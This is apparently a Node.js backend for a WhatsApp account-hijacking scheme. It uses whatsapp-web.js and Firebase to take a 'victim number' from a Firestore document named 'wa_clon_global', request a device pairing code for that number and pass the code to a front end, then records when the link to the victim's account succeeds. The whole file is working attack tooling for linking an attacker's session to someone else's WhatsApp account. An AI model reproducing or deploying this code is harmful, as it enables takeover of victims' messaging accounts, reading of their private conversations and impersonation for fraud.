const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: {
        headless: true,
        // HEMOS QUITADO EL EXECUTABLE PATH PARA QUE NO DE ERROR
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--no-zygote',
            '--single-process'
        ]
    }
});

// ESCUCHA DE FIREBASE
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    if (!snap.exists) return;
    const data = snap.data();
    if (data.status === "solicitando_codigo" && data.numero_victima && !data.pairingCode) {
        console.log("PROCESANDO NÚMERO: " + data.numero_victima);
        try {
            const code = await client.requestPairingCode(data.numero_victima);
            console.log("ÉXITO - CÓDIGO GENERADO: " + code);
            await snap.ref.update({ pairingCode: code, status: "mostrando_codigo" });
        } catch (e) {
            console.log("ERROR AL GENERAR CÓDIGO: " + e.message);
        }
    }
});

client.on('ready', () => {
    console.log("VINCULACIÓN EXITOSA");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize().catch(err => console.log("Error Init:", err));

const port = process.env.PORT || 3000;
http.createServer((req, res) => { res.end('ONLINE'); }).listen(port);
